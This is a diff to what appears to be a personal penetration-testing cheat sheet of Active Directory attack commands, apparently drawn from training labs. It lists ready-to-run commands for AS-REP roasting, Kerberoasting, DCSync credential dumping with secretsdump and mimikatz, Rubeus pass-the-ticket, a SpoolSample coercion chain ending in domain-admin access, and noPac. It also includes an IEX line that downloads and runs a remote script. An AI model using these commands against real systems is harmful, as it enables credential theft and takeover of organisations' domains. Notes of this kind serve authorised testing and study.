@@ -634,27 +634,16 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/Domai
 Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue
 ```
 ### AD
-#### AS-REP
+#### impacket
 ```bash
-# impacket
+# AS-REP
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/user:pass
 impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt
 
-# Rubeus
-.\Rubeus.exe asreproast /nowrap /dc:
-```
-#### Kerberoasting 
-```bash
-# impacket
+# kerberoasting
 impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
-
-# Rubeus
-.\Rubeus.exe kerberoast /stats
-.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
-# RC4
-.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
 ```
-#### DCsync
+##### DCsync - secretsdump
 https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
 ```bash
 impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc
@@ -664,6 +653,26 @@ impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user A
 impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
 # ntds.dit
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
+```
+
+#### Rubeus
+```bash
+# Ticket monitoring
+.\Rubeus.exe monitor /interval:5 /nowrap
+#PTT
+.\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
+# TGT renew
+.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap
+
+
+# AS-REP
+.\Rubeus.exe asreproast /nowrap /dc:
+
+# Kerberoasting
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
+# RC4
+.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
 ```
 
 
@@ -1106,7 +1115,22 @@ https://github.com/calebstewart/CVE-2021-1675
 https://github.com/GossiTheDog/HiveNightmare/releases/tag/0.6
 
 ### S4U
-#### BASIC
+#### SpoolSample
+https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
+```powershell
+ .\Rubeus.exe monitor /interval:5 /nowrap
+
+.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+
+.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap
+
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:administrator /domain:htb.local" "exit"
+
+.\Rubeus.exe asktgt /rc4:NTLM /user:administrator /ptt /nowrap
+
+dir \\dc01.inlanefreight.local\c$
+```
+#### RBCD
 https://github.com/Kevin-Robertson/Powermad
 <br/>
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
@@ -1149,6 +1173,7 @@ python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY
 # DCSync
  python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
 ```
+
 ### ADCS
 https://github.com/secure-77/Certipy-Docker
 ```powershell
